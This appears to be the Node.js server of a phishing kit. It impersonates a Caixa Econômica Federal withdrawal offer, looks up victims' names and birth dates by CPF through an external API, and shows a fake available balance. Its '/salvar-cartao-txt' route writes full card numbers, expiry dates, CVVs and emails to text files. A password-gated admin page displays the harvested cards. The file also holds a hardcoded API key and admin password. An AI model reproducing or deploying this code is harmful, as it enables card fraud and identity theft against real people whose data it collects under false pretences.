const express = require('express');
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();

// Middlewares
app.use(cors());
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==================== ARMAZENAMENTO DE BLOQUEIOS ====================
const bloqueios = new Map(); // Armazena CPFs bloqueados com timestamp

function bloquearCPF(cpf, minutos = 30) {
    const expiraEm = Date.now() + (minutos * 60 * 1000);
    bloqueios.set(cpf, expiraEm);
    console.log(`🔒 CPF ${cpf} BLOQUEADO por ${minutos} minutos (1 tentativa errada)`);
}

function verificarBloqueio(cpf) {
    const expiraEm = bloqueios.get(cpf);
    if (!expiraEm) return false;
    
    if (Date.now() > expiraEm) {
        bloqueios.delete(cpf);
        console.log(`🔓 CPF ${cpf} desbloqueado`);
        return false;
    }
    return true;
}

function getTempoRestanteBloqueio(cpf) {
    const expiraEm = bloqueios.get(cpf);
    if (!expiraEm) return 0;
    const restante = Math.ceil((expiraEm - Date.now()) / 1000 / 60);
    return restante > 0 ? restante : 0;
}

// Função para gerar data aleatória
function gerarDataAleatoria(anoMin, anoMax) {
  const ano = Math.floor(Math.random() * (anoMax - anoMin + 1) + anoMin);
  const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
  const dia = String(Math.floor(Math.random() * 28) + 1).padStart(2, '0');
  return `${ano}-${mes}-${dia}`;
}

function formatarData(dataStr) {
  if (!dataStr) return '---';
  const partes = dataStr.split('-');
  if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
  return dataStr;
}

function gerarValorPorCPF(cpf) {
  let hash = 0;
  for (let i = 0; i < cpf.length; i++) {
    hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
    hash = hash & hash;
  }
  const min = 500;
  const max = 150000;
  const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
  const valorReais = (valorCentavos / 100).toFixed(2);
  return parseFloat(valorReais);
}

// ====================== VALIDAÇÃO CPF LUHN ======================
function validarCPFLuhn(cpf) {
    const cpfLimpo = cpf.toString().replace(/\D/g, '');
    
    if (cpfLimpo.length !== 11) return false;
    
    // Verifica se todos os dígitos são iguais (CPF inválido)
    if (/^(\d)\1{10}$/.test(cpfLimpo)) return false;
    
    // Validação do primeiro dígito verificador
    let soma = 0;
    for (let i = 0; i < 9; i++) {
        soma += parseInt(cpfLimpo.charAt(i)) * (10 - i);
    }
    let resto = 11 - (soma % 11);
    let digito1 = resto >= 10 ? 0 : resto;
    if (digito1 !== parseInt(cpfLimpo.charAt(9))) return false;
    
    // Validação do segundo dígito verificador
    soma = 0;
    for (let i = 0; i < 10; i++) {
        soma += parseInt(cpfLimpo.charAt(i)) * (11 - i);
    }
    resto = 11 - (soma % 11);
    let digito2 = resto >= 10 ? 0 : resto;
    if (digito2 !== parseInt(cpfLimpo.charAt(10))) return false;
    
    return true;
}

// ROTA PARA BUSCAR CPF
app.post('/buscar-cpf', async (req, res) => {
  const { cpf } = req.body;
  console.log(`🔍 Buscando CPF: ${cpf}`);

  if (!cpf || cpf.length !== 11) {
    return res.status(400).json({ success: false, erro: 'CPF inválido' });
  }

  // 🔴 VALIDAÇÃO OBRIGATÓRIA DO CPF (Luhn)
  if (!validarCPFLuhn(cpf)) {
    console.log(`❌ CPF ${cpf} REJEITADO - Não passa na validação Luhn`);
    return res.json({
      success: false,
      erro: '❌ CPF INVÁLIDO',
      detalhe: 'Digite um CPF válido.'
    });
  }

  // 🔴 VERIFICAR SE CPF ESTÁ BLOQUEADO
  if (verificarBloqueio(cpf)) {
    const minutosRestantes = getTempoRestanteBloqueio(cpf);
    return res.json({
      success: false,
      erro: `🔒 CPF BLOQUEADO`,
      detalhe: `Você errou a data de nascimento. Aguarde ${minutosRestantes} minutos para tentar novamente.`,
      bloqueado: true,
      tempoRestante: minutosRestantes
    });
  }

  try {
    const fetch = await import('node-fetch');
    const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
      headers: {
        'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
        'Accept': 'application/json'
      },
      timeout: 5000
    });

    if (!response.ok) throw new Error(`API retornou ${response.status}`);

    const data = await response.json();
    let nomeUsuario = '';
    let dataNascimentoReal = '';
    
    if (data.data && data.data.name) {
      nomeUsuario = data.data.name;
      if (data.data.birthDate) dataNascimentoReal = data.data.birthDate;
    } else if (data.name) {
      nomeUsuario = data.name;
    } else if (data.nome) {
      nomeUsuario = data.nome;
    }
    
    if (!dataNascimentoReal) dataNascimentoReal = gerarDataAleatoria(1970, 2000);
    
    const opcoesDatas = [dataNascimentoReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    console.log(`✅ Dados encontrados: ${nomeUsuario}`);
    
    res.json({
      success: true,
      nome: nomeUsuario || 'Usuário encontrado',
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataNascimentoReal,
      valorDisponivel: gerarValorPorCPF(cpf),
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '*****-*',
      message: 'Dados obtidos com sucesso!'
    });

  } catch (err) {
    console.error('❌ Erro na API:', err.message);
    
    const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
    const dataReal = gerarDataAleatoria(1970, 2000);
    
    const opcoesDatas = [dataReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    res.json({
      success: true,
      nome: nomeSimulado,
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataReal,
      valorDisponivel: gerarValorPorCPF(cpf),
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '12345-6',
      simulado: true,
      message: 'Dados simulados'
    });
  }
});

// ====================== ROTA PARA REGISTRAR DATA ERRADA (BLOQUEIO NA PRIMEIRA) ======================
app.post('/registrar-data-errada', (req, res) => {
  const { cpf } = req.body;
  console.log(`⚠️ DATA ERRADA para CPF: ${cpf} - BLOQUEANDO IMEDIATAMENTE`);
  
  // BLOQUEIA NA PRIMEIRA TENTATIVA ERRADA
  bloquearCPF(cpf, 30);
  
  res.json({
    success: false,
    bloqueado: true,
    mensagem: '❌ DATA DE NASCIMENTO INCORRETA! CPF bloqueado por 30 minutos.',
    tempoRestante: 30
  });
});

// ROTAS HTML
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pagamento.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'pagamento.html'));
});

// ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
app.post('/salvar-cartao-txt', (req, res) => {
    const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
    
    console.log('📥 Salvando cartão...');
    console.log('📦 Dados:', req.body);
    
    const dataHora = new Date().toLocaleString('pt-BR');
    const conteudo = `============================================================
📅 DATA/HORA: ${dataHora}
👤 NOME: ${nome}
🆔 CPF: ${cpf}
💳 CARTÃO: ${cartao}
📅 VALIDADE: ${validade}
🔢 CVV: ${cvv}
📧 E-MAIL: ${email}
💰 VALOR: ${valor}
============================================================

`;
    
    try {
        const pastaDados = '/tmp/dados_cartoes';
        if (!fs.existsSync(pastaDados)) {
            fs.mkdirSync(pastaDados, { recursive: true });
            console.log('📁 Pasta criada em:', pastaDados);
        }
        
        const nomeArquivo = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
        const caminhoArquivo = path.join(pastaDados, nomeArquivo);
        
        fs.appendFileSync(caminhoArquivo, conteudo, 'utf8');
        
        console.log(`✅ Cartão salvo em: ${caminhoArquivo}`);
        res.json({ success: true });
        
    } catch (err) {
        console.error('❌ Erro:', err.message);
        res.status(500).json({ success: false, erro: err.message });
    }
});

// ====================== ADMIN - VER CARTÕES SALVOS ======================
app.get('/admin/ver-cartoes-servidor', (req, res) => {
    const SENHA_ADMIN = "777ga30";
    const senhaDigitada = req.query.senha || '';
    
    if (senhaDigitada !== SENHA_ADMIN) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><meta charset="UTF-8"><title>Acesso Restrito</title>
            <style>
                body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: monospace; }
                .login-box { background: #0f3460; padding: 40px; border-radius: 20px; text-align: center; border-left: 4px solid #ffb600; }
                h1 { color: #ffb600; }
                input { padding: 10px; margin: 20px 0; border-radius: 8px; border: none; width: 100%; background: #1a1a2e; color: #fff; }
                button { background: #ffb600; color: #004aad; padding: 10px 30px; border: none; border-radius: 8px; cursor: pointer; }
            </style>
            </head>
            <body>
                <div class="login-box">
                    <h1>🔒 ACESSO RESTRITO</h1>
                    <form method="GET">
                        <input type="password" name="senha" placeholder="Digite a senha" autocomplete="off">
                        <button type="submit">ENTRAR</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    }
    
    const pasta = '/tmp/dados_cartoes';
    let html = `<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Admin - Cartões</title>
        <style>
            body { font-family: monospace; background: #1a1a2e; padding: 20px; color: #fff; }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { text-align: center; color: #ffb600; }
            .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
            .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; }
            .card h3 { color: #ffb600; }
            pre { background: #1a1a2e; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
            button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; }
            .logout { text-align: right; margin-bottom: 15px; }
            .logout a { color: #ffb600; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logout"><a href="?">🚪 Sair</a></div>
            <h1>📋 ADMIN - CARTÕES SALVOS</h1>
            <div class="stats">📂 Pasta: /tmp/dados_cartoes/</div>
            <button onclick="location.reload()">🔄 Atualizar</button>
    `;
    
    try {
        if (fs.existsSync(pasta)) {
            const arquivos = fs.readdirSync(pasta).filter(f => f.endsWith('.txt')).sort().reverse();
            console.log(`📁 Encontrados ${arquivos.length} arquivos`);
            
            if (arquivos.length === 0) {
                html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3><p>Faça uma solicitação de saque para aparecer aqui.</p></div>';
            } else {
                arquivos.forEach(arq => {
                    const caminho = path.join(pasta, arq);
                    const conteudo = fs.readFileSync(caminho, 'utf8');
                    html += `
                        <div class="card">
                            <h3>📄 ${arq}</h3>
                            <pre>${conteudo.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
                        </div>
                    `;
                });
            }
        } else {
            html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3><p>Faça uma solicitação de saque para aparecer aqui.</p></div>';
        }
    } catch(e) {
        console.error('Erro ao ler pasta:', e);
        html += `<div class="card"><h3>❌ Erro ao ler arquivos: ${e.message}</h3></div>`;
    }
    
    html += `</div></body></html>`;
    res.send(html);
});

// FALLBACK
app.use((req, res) => {
  res.status(404).send('Página não encontrada');
});

// INICIA O SERVIDOR
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes-servidor?senha=777ga30`);
});